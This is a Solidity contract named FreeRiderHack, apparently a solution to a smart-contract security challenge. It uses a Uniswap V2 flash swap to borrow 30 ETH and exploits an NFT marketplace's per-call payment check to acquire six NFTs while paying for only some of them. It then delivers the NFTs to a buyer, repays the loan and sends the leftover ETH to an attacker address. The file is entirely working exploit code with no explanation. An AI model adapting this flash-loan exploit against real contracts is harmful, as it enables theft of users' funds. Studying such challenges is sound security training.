// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface IWETH {
	function withdraw(uint) external;
	function deposit() external payable;
	function transfer(address, uint256) external returns (bool);
}

interface IFreeRiderNFTMarketplace {
	function buyMany(uint256[] calldata tokenIds) external payable;
	function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
}

contract FreeRiderHack is IERC721Receiver, IUniswapV2Callee {
	using Address for address payable;

	address immutable public pair;
	address immutable public nftMarket;
	address immutable public attacker;
	address immutable public buyer;
	address immutable public nft;
	address immutable public weth;

	constructor(address _pair, address _nftMarket, address _attacker, address _buyer, address _weth, address _nft) {
		pair = _pair;
		nftMarket = _nftMarket;
		attacker = _attacker;
		buyer = _buyer;
		nft = _nft;
		weth = _weth;
	}

	function hack() public {
		IUniswapV2Pair(pair).swap(30 ether, 0, address(this), hex"00");
	}

	function uniswapV2Call(address, uint256, uint256, bytes calldata) external override {
		IWETH(weth).withdraw(30 ether);

		uint256[] memory tokenIds = new uint256[](6);
		tokenIds[0] = 0;
		tokenIds[1] = 1;
		tokenIds[2] = 2;
		tokenIds[3] = 3;
		tokenIds[4] = 4;
		tokenIds[5] = 5;

		uint256[] memory sellIds = new uint256[](2);
		sellIds[0] = 0;
		sellIds[1] = 1;

		uint256[] memory sellPrice = new uint256[](2);
		sellPrice[0] = 15 ether;
		sellPrice[1] = 15 ether;

		IFreeRiderNFTMarketplace(nftMarket).buyMany{value: 15 ether}(tokenIds);

		IERC721(nft).setApprovalForAll(nftMarket, true);
		IFreeRiderNFTMarketplace(nftMarket).offerMany(sellIds, sellPrice);
		IFreeRiderNFTMarketplace(nftMarket).buyMany{value: 15 ether}(sellIds);

		for (uint8 i = 0; i<6; i++) {
			IERC721(nft).safeTransferFrom(address(this), buyer, i);
		}

		uint256 fee = ((30 ether * 3)/ uint256(997)) + 1;
		IWETH(weth).deposit{value: 30 ether + fee}();
		IWETH(weth).transfer(pair, 30 ether + fee);

		payable(attacker).sendValue(address(this).balance);
	}

	function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
		return IERC721Receiver.onERC721Received.selector;
	}

	receive() external payable {}
}